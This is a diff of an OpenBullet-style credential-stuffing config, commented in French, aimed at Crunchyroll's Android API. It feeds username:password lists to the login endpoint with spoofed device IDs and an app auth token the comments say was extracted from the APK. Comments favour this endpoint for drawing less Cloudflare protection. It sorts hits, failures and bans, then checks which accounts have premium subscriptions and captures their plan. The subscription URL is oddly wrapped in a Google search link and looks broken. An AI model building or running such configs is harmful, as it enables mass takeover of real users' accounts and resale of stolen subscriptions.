@@ -1,6 +1,6 @@
 [SETTINGS]
 {
-"Name": "Crunchyroll Android API",
+"Name": "Crunchyroll Android API V3",
 "SuggestedBots": 50,
 "MaxRecheckModes": 1,
 "Separator": ":",
@@ -15,17 +15,21 @@
 }
 }
 ​[SCRIPT]
-​1. Génération d'un Device ID Aléatoire
+​--- GENERATION DES IDENTIFIANTS MOBILES ---
+​On simule un appareil unique pour chaque essai
 ​FUNCTION Guid -> VAR "DEVICE_ID"
-​2. Requête Login vers l'API Beta (Android)
-​Note: On utilise le Basic Auth Token officiel de l'app Android
+FUNCTION ToUppercase "<DEVICE_ID>" -> VAR "UPPER_DEVICE_ID"
+​--- REQUETE DE CONNEXION (TOKEN) ---
+​Utilisation de l'API Beta Android (Moins de Cloudflare)
 ​REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token"
-CONTENT "grant_type=password&scope=offline_access&username=<USER>&password=<PASS>&device_id=<DEVICE_ID>&device_name=Pixel+7&device_type=android"
+CONTENT "grant_type=password&scope=offline_access&username=<USER>&password=<PASS>&device_id=<DEVICE_ID>&device_name=SM-G991B&device_type=android"
 CONTENTTYPE "application/x-www-form-urlencoded"
 HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
-HEADER "Authorization: Basic dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
+​Token Basic officiel extrait de l'APK Crunchyroll
+​HEADER "Authorization: Basic dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
 HEADER "Etp-Anonymous-Id: <DEVICE_ID>"
-​Analyse de la réponse de connexion
+HEADER "Accept-Encoding: gzip"
+​--- ANALYSE DU RESULTAT LOGIN ---
 ​KEYCHECK
 KEYCHAIN Success OR
 VALUE "access_token" EXISTS
@@ -35,19 +39,26 @@ VALUE "Unauthorized" EXISTS
 KEYCHAIN Ban OR
 VALUE "403 Forbidden" EXISTS
 VALUE "Cloudflare" EXISTS
-​3. Récupération du profil pour vérifier l'abonnement
+VALUE "Access Denied" EXISTS
+​Extraction du token d'accès
 ​PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN"
+​--- VERIFICATION DU STATUT PREMIUM ---
+​On interroge l'API des souscriptions pour savoir si c'est un HIT ou un FREE
 ​REQUEST GET "https://www.google.com/search?q=https://beta-api.crunchyroll.com/subs/v1/subscriptions/me"
 HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
 HEADER "Authorization: Bearer <TOKEN>"
-​4. Vérification Premium
+​--- TRI FINAL ---
 ​KEYCHECK
 KEYCHAIN Success OR
 VALUE "premium" EXISTS
 VALUE "subscription" EXISTS
+VALUE "plan_id" EXISTS
 KEYCHAIN Custom "FREE" OR
 VALUE "[]" EXISTS
+VALUE "total":0" EXISTS
 VALUE "no_subscription" EXISTS
-​5. Capture des infos
-​PARSE "<SOURCE>" JSON "total" -> CAP "Subs Count"
-PARSE "<SOURCE>" JSON "external_id" -> CAP "Plan"
+​--- CAPTURE DES INFOS ---
+​Pour voir quel plan le compte possède dans tes logs
+​PARSE "<SOURCE>" JSON "total" -> CAP "Nb Abonnements"
+PARSE "<SOURCE>" JSON "external_id" -> CAP "Type de Plan"
+PARSE "<SOURCE>" JSON "status" -> CAP "Statut"
